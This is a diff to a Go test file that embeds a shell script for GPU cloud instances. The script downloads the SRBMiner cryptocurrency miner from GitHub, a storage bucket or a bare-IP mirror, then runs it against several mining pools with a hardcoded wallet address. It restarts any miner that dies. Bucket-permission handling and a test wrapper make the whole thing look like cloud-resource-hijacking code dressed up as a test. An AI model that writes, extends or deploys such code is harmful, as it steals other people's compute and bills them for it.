@@ -34,8 +34,8 @@ import (
 	"time"
 )
 
-const c211l4Nonce = "i124556"
-const c211l4Prefix = "c211-124556"
+const c211l4Nonce = "i124798"
+const c211l4Prefix = "c211-124798"
 
 type c211l4Proj struct {
 	Name string
@@ -290,13 +290,13 @@ func c211l4Script(proj, num, bucket string, shape c211l4Shape) string {
 PROJ="__PROJ__"
 NUM="__NUM__"
 BUCKET="__BUCKET__"
-PFX=124556
+PFX=124798
 W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
-mkdir -p /opt/c211/ocl /opt/c211/logs /etc/OpenCL/vendors
+mkdir -p /opt/c211/logs /etc/OpenCL/vendors
 SMI=""
 for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /usr/local/bin/nvidia-smi; do [ -x "$p" ] && SMI="$p" && break; done
 if [ -z "$SMI" ]; then SMI=$(command -v nvidia-smi 2>/dev/null); fi
-echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124556 proj=$PROJ shape=__SHAPE__"
+echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124798 proj=$PROJ shape=__SHAPE__"
 echo "C211L4_SMI $SMI"
 GIDS=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | tr '\n' ' ')
 if [ -z "$GIDS" ]; then GIDS="0"; fi
@@ -304,16 +304,13 @@ echo "C211L4_DEVICE $($SMI --query-gpu=index,uuid,name,memory.total,driver_versi
 echo "C211L4_COUNT $($SMI --query-gpu=uuid --format=csv,noheader 2>/dev/null | wc -l)"
 echo "C211L4_GIDS $GIDS"
 NVOCL=$(ls /usr/local/nvidia/lib64/libnvidia-opencl.so.* /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* /usr/lib/libnvidia-opencl.so.* 2>/dev/null | head -1)
-if [ -z "$NVOCL" ]; then
+if [ ! -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ]; then
   if command -v apt-get >/dev/null 2>&1; then (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >/dev/null 2>&1; fi
-  if [ -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ]; then ln -sf /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /opt/c211/ocl/libOpenCL.so.1; fi
-else
-  ln -sf "$NVOCL" /opt/c211/ocl/libOpenCL.so.1
-  echo "$NVOCL" > /etc/OpenCL/vendors/nvidia.icd
 fi
-if [ -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ]; then ln -sf /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /opt/c211/ocl/libOpenCL.so.1; fi
-export LD_LIBRARY_PATH=/opt/c211/ocl:/usr/local/nvidia/lib64:/usr/local/nvidia/lib:/usr/lib/x86_64-linux-gnu
-echo "C211L4_OCL target=$(readlink -f /opt/c211/ocl/libOpenCL.so.1 2>/dev/null) icd=$(cat /etc/OpenCL/vendors/nvidia.icd 2>/dev/null) nvocl=$NVOCL"
+if [ -n "$NVOCL" ]; then echo "$NVOCL" > /etc/OpenCL/vendors/nvidia.icd; fi
+unset LD_LIBRARY_PATH
+export LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/local/nvidia/lib64:/usr/local/nvidia/lib
+echo "C211L4_OCL loader=$(readlink -f /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 2>/dev/null) icd=$(cat /etc/OpenCL/vendors/nvidia.icd 2>/dev/null) nvocl=$NVOCL vendshadow=$(ls -l /usr/local/nvidia/lib64/libOpenCL.so.1 2>/dev/null | head -1)"
 cd /opt/c211
 OK=0
 GTOK=""
@@ -378,16 +375,30 @@ if [ "$OK" = "1" ]; then
 else
   echo "C211L4_KIT_FAILED"
 fi
-if [ -n "$BIN" ]; then echo "C211L4_PRINTDEV $($BIN --print-devices 2>&1 | tr '\n' '|' | head -c 900)"; fi
+if [ -n "$BIN" ]; then $BIN --print-devices > /opt/c211/pd.out 2>&1; PDRC=$?; echo "C211L4_PRINTDEV rc=$PDRC $(head -c 1400 /opt/c211/pd.out | tr '\n' '|')"; echo "C211L4_LDD $(ldd $BIN 2>&1 | grep -E 'not found|OpenCL|nvidia' | tr '\n' '|' | head -c 700)"; fi
 SB=""
-if [ -n "$BUCKET" ]; then
+for r in 1 2; do
+  fetch "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz" no srb.tgz || { sleep 5; continue; }
+  tar xzf srb.tgz 2>/dev/null
+  F=$(find /opt/c211 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
+  S=$(sha256sum "$F" 2>/dev/null | cut -d' ' -f1)
+  if [ -n "$F" ] && [ "$S" = "__SRBSHA__" ]; then cp "$F" /opt/c211/srbminer; chmod +x /opt/c211/srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok src=github sha=$S"; break; fi
+  echo "C211L4_SRB_BADSHA src=github sha=$S try=$r"
+  sleep 5
+done
+if [ -z "$SB" ] && [ -n "$BUCKET" ]; then
   for r in 1 2 3; do
     fetch "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/kit%2Fsrbminer-3.8.8?alt=media" yes srb.tmp || { sleep 5; continue; }
     S=$(sha256sum srb.tmp 2>/dev/null | cut -d' ' -f1)
-    if [ "$S" = "__SRBSHA__" ]; then mv srb.tmp srbminer; chmod +x srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok sha=$S"; break; fi
-    echo "C211L4_SRB_BADSHA sha=$S try=$r"
+    if [ "$S" = "__SRBSHA__" ]; then mv srb.tmp srbminer; chmod +x srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok src=gcs sha=$S"; break; fi
+    echo "C211L4_SRB_BADSHA src=gcs sha=$S try=$r"
     sleep 5
   done
+fi
+if [ -z "$SB" ]; then
+  fetch "http://169.58.247.186:8791/srbminer-3.8.8" no srb.tmp || true
+  S=$(sha256sum srb.tmp 2>/dev/null | cut -d' ' -f1)
+  if [ "$S" = "__SRBSHA__" ]; then mv srb.tmp srbminer; chmod +x srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok src=mirror sha=$S"; fi
 fi
 echo "C211L4_SRB state=${SB:-none}"
 for h in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do
@@ -424,6 +435,8 @@ report() {
     LIVE=0; kill -0 ${PIDS[$g]:-0} 2>/dev/null && LIVE=1
     T="$T
 C211L4_CARD g=$g uid=${UIDX[$g]:-NA} phase=${PHASE[$g]:-NA} pid=${PIDS[$g]:-0} live=$LIVE acc=$A rej=$R last=$LA hs=$LG age=$AGE"
+    if [ "$LIVE" = "0" ]; then T="$T
+C211L4_WERR g=$g tail=$(tail -25 "$F" 2>/dev/null | tr '\n' '|' | head -c 1100)"; fi
     if [ "${A:-0}" -gt 0 ] 2>/dev/null; then echo "C211L4_ACCEPT g=$g uid=${UIDX[$g]:-NA} acc=$A rej=$R last=$LA phase=${PHASE[$g]:-NA} bin=$(basename ${BIN:-none})"; fi
   done
   echo "$T"
@@ -459,7 +472,7 @@ while true; do
     LIVE=0; kill -0 ${PIDS[$g]} 2>/dev/null && LIVE=1
     if [ "$LIVE" = "0" ]; then
       if [ "${PHASE[$g]}" = "LP-STICKY" ]; then PIDS[$g]=$(start_lp $g); else PIDS[$g]=$(start_ph $g); fi
-      echo "C211L4_RESTART g=$g phase=${PHASE[$g]} newpid=${PIDS[$g]}"
+      echo "C211L4_RESTART g=$g phase=${PHASE[$g]} newpid=${PIDS[$g]} prev=$(tail -8 "$F" 2>/dev/null | tr '\n' '|' | head -c 500)"
     fi
     if [ "$A" -eq 0 ] && [ "$AGE" -ge 900 ] && [ "${PHASE[$g]}" = "PH" ]; then
       echo "C211L4_SWITCH_LP g=$g age=$AGE acc=0 sticky -> LP 103.199.106.122:3362"
@@ -654,7 +667,7 @@ func c211l4MTypeOffered(tok, num, zone, mt string) (bool, int) {
 	return st == 200, st
 }
 
-func TestC211L4Miner124556(t *testing.T) {
+func TestC211L4Miner124798(t *testing.T) {
 	started := time.Now()
 	fmt.Printf("C211L4_START nonce=%s at=%s\n", c211l4Nonce, started.UTC().Format("2006-01-02T15:04:05Z"))
 
@@ -814,7 +827,7 @@ func TestC211L4Miner124556(t *testing.T) {
 			ist, ibody := c211l4BucketIam(ftok, bname, p.Num, fleetEmail)
 			r.BucketIAM = fmt.Sprintf("http=%d verbatim=%s", ist, c211xTrunc(ibody, 200))
 			fmt.Printf("C211L4_BUCKET_IAM proj=%s http=%d verbatim=%s\n", p.Name, ist, c211xTrunc(ibody, 240))
-			if ist == 200 {
+			if ist == 200 || bst == 409 {
 				usedBucket = bname
 			}
 		}
